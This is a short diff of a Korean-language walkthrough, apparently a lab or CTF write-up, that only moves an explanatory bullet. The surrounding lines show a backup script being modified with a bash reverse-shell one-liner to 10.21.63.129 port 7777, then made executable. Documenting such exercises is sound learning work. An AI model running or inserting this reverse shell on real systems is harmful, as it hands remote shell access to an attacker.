@@ -48,11 +48,12 @@ vi /home/karen/backup.sh
 bash -i >& /dev/tcp/10.21.63.129/7777 0>&1
 ```
 - 이 명령어는 bash 셸을 통해 공격자의 머신(10.21.63.129)의 7777 포트로 TCP 연결을 시도하며, 입출력을 해당 연결에 리디렉션함으로써 원격 쉘을 확보할 수 있도록 한다.
-- 변경 후 실행 권한을 추가하였다.
 
 ```bash
 chmod +x /home/karen/backup.sh
 ```
+
+- 변경 후 실행 권한을 추가하였다.
 
 ![악성 스크립트 수정](./screenshots/modify_script.png)
 
